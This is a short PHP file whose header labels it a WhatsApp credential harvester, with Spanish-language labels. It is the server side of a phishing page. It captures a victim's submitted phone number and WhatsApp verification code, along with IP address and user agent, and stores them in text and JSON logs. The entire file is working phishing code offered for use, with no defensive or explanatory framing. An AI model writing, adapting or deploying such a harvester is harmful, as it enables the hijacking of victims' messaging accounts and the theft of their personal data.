<?php
// ingenieriasocial - WhatsApp Credential Harvester
// Creado por: MidasOrion

$log_file = 'captured_credentials.txt';
$phone = isset($_POST['phone']) ? $_POST['phone'] : '';
$code = isset($_POST['code']) ? $_POST['code'] : '';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

$log_entry = "═══════════════════════════════════════════════════════════\n";
$log_entry .= "WHATSAPP - Credenciales Capturadas\n";
$log_entry .= "═══════════════════════════════════════════════════════════\n";
$log_entry .= "Fecha/Hora: $timestamp\n";
$log_entry .= "Teléfono: $phone\n";
$log_entry .= "Código: $code\n";
$log_entry .= "IP: $ip\n";
$log_entry .= "User-Agent: $user_agent\n";
$log_entry .= "═══════════════════════════════════════════════════════════\n\n";

file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

$json_file = 'captured_credentials.json';
$json_data = array(
    'platform' => 'WhatsApp',
    'timestamp' => $timestamp,
    'phone' => $phone,
    'code' => $code,
    'ip' => $ip,
    'user_agent' => $user_agent
);

$existing_data = array();
if (file_exists($json_file)) {
    $existing_data = json_decode(file_get_contents($json_file), true);
    if (!is_array($existing_data)) {
        $existing_data = array();
    }
}

$existing_data[] = $json_data;
file_put_contents($json_file, json_encode($existing_data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

header('Content-Type: application/json');
echo json_encode(array('status' => 'success'));
exit();
?>
